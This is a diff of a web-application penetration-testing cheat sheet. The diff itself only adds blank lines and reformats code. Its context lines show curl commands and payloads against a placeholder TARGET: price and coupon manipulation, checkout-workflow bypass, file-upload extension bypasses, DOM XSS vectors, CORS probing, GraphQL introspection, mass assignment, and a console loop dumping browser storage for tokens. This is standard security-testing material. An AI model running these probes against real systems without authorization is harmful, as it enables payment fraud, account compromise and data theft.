@@ -13,6 +13,7 @@ signed_by: cyberstrike-official
 ## Business Logic Testing
 
 ### Price & Payment Manipulation
+
 ```bash
 # Negative quantity/price
 curl -X POST https://TARGET/api/cart -d '{"item_id":1,"quantity":-1,"price":100}'
@@ -33,6 +34,7 @@ curl -X POST https://TARGET/api/apply-coupon -d '{"code":"SAVE50","code":"SAVE50
 ```
 
 ### Workflow Bypass
+
 ```bash
 # Skip steps in multi-step process
 # Step 1: /checkout/address → Step 2: /checkout/payment → Step 3: /checkout/confirm
@@ -47,6 +49,7 @@ curl -X POST https://TARGET/checkout -d '{"step":3,"complete":true}'
 ```
 
 ### Rate Limiting & Function Abuse
+
 ```bash
 # Test rate limits
 for i in $(seq 1 100); do
@@ -70,6 +73,7 @@ done
 ```
 
 ### File Upload Abuse
+
 ```bash
 # Extension bypass
 # file.php → file.php.jpg, file.pHp, file.php%00.jpg, file.php;.jpg
@@ -98,6 +102,7 @@ curl -X POST https://TARGET/upload -F "file=@bigfile.bin"
 ### DOM XSS Sources & Sinks
 
 **Sources (attacker-controlled input):**
+
 ```javascript
 document.URL
 document.location
@@ -110,6 +115,7 @@ localStorage / sessionStorage
 ```
 
 **Sinks (dangerous execution points):**
+
 ```javascript
 // High risk
 eval()
@@ -132,6 +138,7 @@ element.src = ...
 ```
 
 ### DOM XSS Testing
+
 ```javascript
 // Check for vulnerable patterns in JS
 // In browser console:
@@ -147,6 +154,7 @@ https://TARGET/search?term=test" onmouseover="alert(1)
 ```
 
 ### postMessage Vulnerabilities
+
 ```javascript
 // Check for listeners without origin validation
 // In browser console:
@@ -159,6 +167,7 @@ https://TARGET/search?term=test" onmouseover="alert(1)
 ```
 
 ### Clickjacking Test
+
 ```bash
 # Check headers
 curl -sI https://TARGET | grep -i "x-frame-options\|content-security-policy"
@@ -170,17 +179,18 @@ curl -sI https://TARGET | grep -i "x-frame-options\|content-security-policy"
 ```
 
 ### Browser Storage Audit
+
 ```javascript
 // In browser console, check for sensitive data:
 // localStorage
-for(let i=0; i<localStorage.length; i++) {
-  let key = localStorage.key(i);
-  console.log(key + ": " + localStorage.getItem(key));
+for (let i = 0; i < localStorage.length; i++) {
+  let key = localStorage.key(i)
+  console.log(key + ": " + localStorage.getItem(key))
 }
 // sessionStorage
-for(let i=0; i<sessionStorage.length; i++) {
-  let key = sessionStorage.key(i);
-  console.log(key + ": " + sessionStorage.getItem(key));
+for (let i = 0; i < sessionStorage.length; i++) {
+  let key = sessionStorage.key(i)
+  console.log(key + ": " + sessionStorage.getItem(key))
 }
 // Look for: tokens, passwords, PII, API keys
 ```
@@ -212,6 +222,7 @@ curl -sI https://TARGET/api/data -H "Origin: https://evil-TARGET" | grep -i "acc
 ## API Security Testing
 
 ### REST API Enumeration
+
 ```bash
 # Common API documentation paths
 curl -s https://TARGET/swagger.json
@@ -235,6 +246,7 @@ curl -s -H "Accept: application/vnd.api.v1+json" https://TARGET/api/users
 ```
 
 ### GraphQL Testing
+
 ```bash
 # Introspection query
 curl -s -X POST https://TARGET/graphql \
@@ -261,6 +273,7 @@ curl -s -X POST https://TARGET/graphql \
 ```
 
 ### WebSocket Testing
+
 ```bash
 # Connect and test
 wscat -c "wss://TARGET/ws"
@@ -279,6 +292,7 @@ websocat wss://TARGET/ws
 ```
 
 ### Mass Assignment in APIs
+
 ```bash
 # Find writable fields by comparing GET response with PUT/PATCH
 GET_RESPONSE=$(curl -s https://TARGET/api/profile -H "Cookie: session=TOKEN")
